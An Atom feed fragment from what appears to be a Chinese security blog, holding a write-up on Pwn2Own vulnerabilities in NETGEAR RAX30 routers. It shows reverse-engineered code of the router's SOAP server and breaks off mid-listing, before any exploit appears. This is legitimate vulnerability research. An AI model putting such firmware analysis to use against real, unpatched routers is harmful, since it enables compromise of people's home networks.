class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2023-1725">https://talosintelligence.com/vulnerability_reports/TALOS-2023-1725</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;uC-HTTP漏洞分析&quot;&gt;&lt;a href=&quot;#uC-HTTP漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;uC-HTTP漏洞分析&quot;&gt;&lt;/a&gt;uC-HTTP漏洞分析&lt;/h1&gt;&lt;h2 id=&quot;描述&quot;&gt;</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://www.z1r0.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="IOT" scheme="https://www.z1r0.top/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Pwn2Own-RAX30 Routers漏洞分析</title>
    <link href="https://www.z1r0.top/2023/09/19/Pwn2Own-RAX30-Routers%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://www.z1r0.top/2023/09/19/Pwn2Own-RAX30-Routers%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-09-19T02:29:11.000Z</published>
    <updated>2023-09-19T02:30:39.522Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="Pwn2Own-RAX30-Routers漏洞分析"><a href="#Pwn2Own-RAX30-Routers漏洞分析" class="headerlink" title="Pwn2Own-RAX30 Routers漏洞分析"></a>Pwn2Own-RAX30 Routers漏洞分析</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>Team82 disclosed five vulnerabilities in <strong><a href="https://www.netgear.com/home/wifi/routers/rax30/">NETGEAR’s Nighthawk RAX30</a></strong> routers as part of its research and participation in last December’s <strong><a href="https://www.zerodayinitiative.com/blog/2022/12/5/pwn2own-toronto-2022-day-one-results">Pwn2Own Toronto hacking competition</a></strong>.</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>固件下载链接：<a href="https://www.downloads.netgear.com/files/GDC/RAX30/RAX30-V1.0.9.92.zip">https://www.downloads.netgear.com/files/GDC/RAX30/RAX30-V1.0.9.92.zip</a></p><p>固件下载之后binwalk可以直接解包，有漏洞在soap_serverd文件中，这是一个soap的server端，所以首先逆向分析一下这个二进制文件</p><p>发现start这里不太能直接看出main函数，所以看一下汇编</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">(<span class="type">void</span> (*a1)(<span class="type">void</span>), <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, ...)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp-4h] [bp-4h]</span></span><br><span class="line">  va_list va; <span class="comment">// [sp+0h] [bp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(va, a4);</span><br><span class="line">  _libc_start_main(</span><br><span class="line">    (<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **))*(&amp;off_4D60 + <span class="number">67722</span>),</span><br><span class="line">    v4,</span><br><span class="line">    (<span class="type">char</span> **)va,</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span>))*(&amp;off_4D60 + <span class="number">67740</span>),</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span>))*(&amp;off_4D60 + <span class="number">67745</span>),</span><br><span class="line">    a1,</span><br><span class="line">    va);</span><br><span class="line">  <span class="built_in">abort</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到main函数是sub_49F4</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00004D18                 MOV             R11, #0</span><br><span class="line">.text:00004D1C                 MOV             LR, #0</span><br><span class="line">.text:00004D20                 POP             {R1}    ; argc</span><br><span class="line">.text:00004D24                 MOV             R2, SP  ; ubp_av</span><br><span class="line">.text:00004D28                 PUSH            {R2}    ; stack_end</span><br><span class="line">.text:00004D2C                 PUSH            {R0}    ; rtld_fini</span><br><span class="line">.text:00004D30                 LDR             R10, =(_GLOBAL_OFFSET_TABLE_ - 0x4D60)</span><br><span class="line">.text:00004D34                 ADR             R3, off_4D60</span><br><span class="line">.text:00004D38                 ADD             R10, R10, R3 ; _GLOBAL_OFFSET_TABLE_</span><br><span class="line">.text:00004D3C                 LDR             R12, =(off_46FE4 - 0x46CA0)</span><br><span class="line">.text:00004D40                 LDR             R12, [R10,R12] ; nullsub_1</span><br><span class="line">.text:00004D44                 PUSH            {R12}   ; fini</span><br><span class="line">.text:00004D48                 LDR             R3, =(off_46FD0 - 0x46CA0)</span><br><span class="line">.text:00004D4C                 LDR             R3, [R10,R3] ; sub_30450 ; init</span><br><span class="line">.text:00004D50                 LDR             R0, =(off_46F88 - 0x46CA0)</span><br><span class="line">.text:00004D54                 LDR             R0, [R10,R0] ; sub_49F4 ; main</span><br><span class="line">.text:00004D58                 BL              __libc_start_main</span><br><span class="line">.text:00004D5C                 BL              abort</span><br></pre></td></tr></tbody></table></figure><p>跟进分析</p><p>添加dpmnlv这些参数</p><p>初始化日志系统，消息模块，主功能模块</p><p>初始化成功，则调用相应功能函数</p><p>如果失败，则释放资源并返回错误码</p><p>主功能函数是sub_8FC0和sub_58C8</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_49F4</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **argv)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+1Ch] [bp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v17 = <span class="number">-1</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">8786</span>;</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">LABEL_2:</span><br><span class="line">    v7 = getopt(a1, argv, <span class="string">"d:p:m:n:l:v"</span>);</span><br><span class="line">    v8 = v7;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )</span><br><span class="line">    {</span><br><span class="line">      log_log(<span class="number">5</span>, <span class="string">"main"</span>, <span class="number">534</span>, <span class="string">"using soapserver serverPort=%ld shmId=%d"</span>, off_47008, v17);</span><br><span class="line">      cmsLog_initWithName(v5, *argv);</span><br><span class="line">      cmsLog_setLevel(v6);</span><br><span class="line">      v9 = cmsMsg_initWithFlags(v5, <span class="number">0</span>, &amp;dword_48244);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      {</span><br><span class="line">        v10 = log_log(<span class="number">3</span>, <span class="string">"main"</span>, <span class="number">541</span>, <span class="string">"cmsMsg_init failed, ret=%d"</span>, v9);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v13 = cmsMdm_initWithAcc(v5, <span class="number">16</span>, dword_48244, &amp;v17);</span><br><span class="line">        <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        {</span><br><span class="line">          v8 = <span class="number">0</span>;</span><br><span class="line">          sub_8FC0(v4);</span><br><span class="line">          v14 = sub_58C8(v2);</span><br><span class="line">          cmsMdm_cleanup(v14);</span><br><span class="line">          v15 = cmsMsg_cleanup(&amp;dword_48244);</span><br><span class="line">          cmsLog_cleanup(v15);</span><br><span class="line">          <span class="keyword">return</span> v8;</span><br><span class="line">        }</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">"main"</span>, <span class="number">548</span>, <span class="string">"cmsMdm_init failed, ret=%d"</span>, v13);</span><br><span class="line">        v10 = cmsMsg_cleanup(&amp;dword_48244);</span><br><span class="line">      }</span><br><span class="line">      cmsLog_cleanup(v10);</span><br><span class="line">      <span class="keyword">return</span> v8;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">100</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v11 = atoi(optarg);</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v11 == <span class="number">1</span> )</span><br><span class="line">        v6 = <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 = <span class="number">7</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v6 = <span class="number">3</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v7 - <span class="number">108</span>) &gt; <span class="number">0xA</span> )</span><br><span class="line">  {</span><br><span class="line">LABEL_24:</span><br><span class="line">    v8 = <span class="number">-1</span>;</span><br><span class="line">    log_log(<span class="number">3</span>, <span class="string">"main"</span>, <span class="number">528</span>, <span class="string">"bad arguments, exit"</span>);</span><br><span class="line">    _printf_chk(<span class="number">1</span>, <span class="string">"usage: %s [-d num] [-p port_num] [-m shmid] [-v]\\n"</span>, *argv);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"       d: set verbosity, where num==0 is LOG_LEVEL_ERR, 1 is LOG_LEVEL_NOTICE, all others is LOG_LEVEL_DEBUG"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"       p: TCP port number for httpd to listen on"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"       m: shared memory id, -1 if standalone or not using shared mem."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"       v: show Netgear SOAP API version."</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">switch</span> ( v7 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'l'</span>:</span><br><span class="line">        <span class="keyword">if</span> ( atoi(optarg) == <span class="number">1</span> )</span><br><span class="line">          v2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'m'</span>:</span><br><span class="line">        v17 = atoi(optarg);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'n'</span>:</span><br><span class="line">        v4 = atoi(optarg);</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          v5 = <span class="number">8785</span>;</span><br><span class="line">          v4 = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'p'</span>:</span><br><span class="line">        off_47008 = (<span class="type">void</span> *)atoi(optarg);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"3.84"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>sub_8FC0函数就是初始化，获取并调用初始化后的处理函数</p><p>sub_58C8函数主要是处理SOAP请求</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_58C8</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">  fd = <span class="number">0</span>;</span><br><span class="line">  addr_len = <span class="number">28</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v73, <span class="number">0</span>, <span class="number">46</span>);</span><br><span class="line">  signal(<span class="number">13</span>, (<span class="type">__sighandler_t</span>)((<span class="type">char</span> *)&amp;dword_0 + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v71.sa_mask, <span class="number">0</span>, <span class="number">0x88</span>u);</span><br><span class="line">  v71.sa_handler = (<span class="type">__sighandler_t</span>)sub_4EBC;</span><br><span class="line">  v71.sa_flags = <span class="number">0x80000000</span>;</span><br><span class="line">  v1 = sigaction(<span class="number">15</span>, &amp;v71, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    log_log(<span class="number">3</span>, <span class="string">"soap_main"</span>, <span class="number">616</span>, <span class="string">"failed to install SIGTERM handler, ret=%d"</span>, v1);</span><br><span class="line">  v2 = sigaction(<span class="number">2</span>, &amp;v71, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    log_log(<span class="number">3</span>, <span class="string">"soap_main"</span>, <span class="number">622</span>, <span class="string">"failed to install SIGINT handler, ret=%d"</span>, v2);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  optval.__fds_bits[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">  <span class="built_in">strcpy</span>(addr, <span class="string">"\\n"</span>);</span><br><span class="line">  v4 = socket(<span class="number">10</span>, <span class="number">524289</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    perror(<span class="string">"socket"</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">    v6 = *_errno_location();</span><br><span class="line">    v7 = strerror(v6);</span><br><span class="line">    log_log(<span class="number">3</span>, <span class="string">"soap_main"</span>, <span class="number">628</span>, <span class="string">"initialize_listen_socket failed, errno=%d(%s)"</span>, v6, v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  fcntl(v4, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">  optval.__fds_bits[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( setsockopt(v5, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    v9 = <span class="string">"setsockopt"</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">    perror(v9);</span><br><span class="line">    close(v5);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">strcpy</span>(addr, <span class="string">"\\n"</span>);</span><br><span class="line">  *(_WORD *)&amp;addr[<span class="number">2</span>] = __rev16((<span class="type">unsigned</span> <span class="type">int</span>)serverport);</span><br><span class="line">  v10 = in6addr_any.in6_u.u6_addr32[<span class="number">1</span>];</span><br><span class="line">  v11 = in6addr_any.in6_u.u6_addr32[<span class="number">2</span>];</span><br><span class="line">  v12 = in6addr_any.in6_u.u6_addr32[<span class="number">3</span>];</span><br><span class="line">  *(_DWORD *)&amp;addr[<span class="number">8</span>] = in6addr_any.in6_u.u6_addr32[<span class="number">0</span>];</span><br><span class="line">  *(_DWORD *)&amp;addr[<span class="number">12</span>] = v10;</span><br><span class="line">  *(_DWORD *)&amp;addr[<span class="number">16</span>] = v11;</span><br><span class="line">  *(_DWORD *)&amp;addr[<span class="number">20</span>] = v12;</span><br><span class="line">  <span class="keyword">if</span> ( bind(v5, (<span class="type">const</span> <span class="keyword">struct</span> sockaddr *)addr, <span class="number">0x1C</span>u) &lt; <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    v9 = <span class="string">"bind"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( listen(v5, <span class="number">10</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    v9 = <span class="string">"listen"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  }</span><br><span class="line">  v13 = dword_49448;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    ++v3;</span><br><span class="line">    v14 = <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="number">0x5C</span>u);</span><br><span class="line">    *v14 = <span class="number">-1</span>;</span><br><span class="line">    v13 = v14 + <span class="number">23</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( v3 != <span class="number">64</span> );</span><br><span class="line">  sub_5898(v14, v15, <span class="number">-1</span>, v13);</span><br><span class="line">  v63 = <span class="number">1</span> &lt;&lt; (v5 &amp; <span class="number">0x1F</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    {</span><br><span class="line">LABEL_18:</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v17 = &amp;unk_49450;</span><br><span class="line">        v18 = <span class="number">0</span>;</span><br><span class="line">        v19 = <span class="number">0</span>;</span><br><span class="line">        v20 = time(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( *(v17 - <span class="number">2</span>) != <span class="number">-1</span> )</span><br><span class="line">          {</span><br><span class="line">            v21 = *(v17 - <span class="number">1</span>);</span><br><span class="line">            ++v18;</span><br><span class="line">            <span 